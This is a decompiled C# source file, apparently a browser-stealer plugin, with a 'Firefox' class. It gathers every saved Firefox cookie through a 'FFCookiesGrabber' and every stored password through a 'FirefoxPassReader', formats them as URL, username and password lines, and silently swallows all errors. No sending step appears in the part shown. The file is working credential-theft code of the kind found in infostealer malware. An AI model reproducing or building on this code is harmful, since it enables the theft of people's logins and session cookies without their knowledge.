using System;
using System.Collections.Generic;
using System.Text;
using Plugin.Browsers.Firefox.Cookies;

namespace Plugin.Browsers.Firefox
{
	// Token: 0x02000011 RID: 17
	public class Firefox
	{
		// Token: 0x06000080 RID: 128 RVA: 0x00005C5C File Offset: 0x00003E5C
		public void CookiesRecovery(StringBuilder Cooks)
		{
			try
			{
				List<FFCookiesGrabber.FirefoxCookie> ffcs = FFCookiesGrabber.Cookies();
				foreach (FFCookiesGrabber.FirefoxCookie fcc in ffcs)
				{
					bool flag = !string.IsNullOrWhiteSpace(fcc.ToString()) && !this.isOK;
					if (flag)
					{
						Cooks.Append("\n== Firefox ==========\n");
						this.isOK = true;
					}
					Cooks.Append(string.Concat(new string[]
					{
						fcc.ToString(),
						"\n\n"
					}));
				}
				Cooks.Append("\n");
			}
			catch
			{
			}
		}

		// Token: 0x06000081 RID: 129 RVA: 0x00005D24 File Offset: 0x00003F24
		public void CredRecovery(StringBuilder Pass)
		{
			try
			{
				foreach (IPassReader passReader in new List<IPassReader>
				{
					new FirefoxPassReader()
				})
				{
					foreach (CredentialModel credentialModel in passReader.ReadPasswords())
					{
						bool flag = !string.IsNullOrWhiteSpace(credentialModel.Url) && !this.isOK;
						if (flag)
						{
							Pass.Append("\n== Firefox ==========\n");
							this.isOK = true;
						}
						Pass.Append(string.Concat(new string[]
						{
							credentialModel.Url,
							"\nU: ",
							credentialModel.Username,
							"\nP: ",
							credentialModel.Password,
							"\n\n"
						}));
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000031 RID: 49
		public bool isOK = false;
	}
}
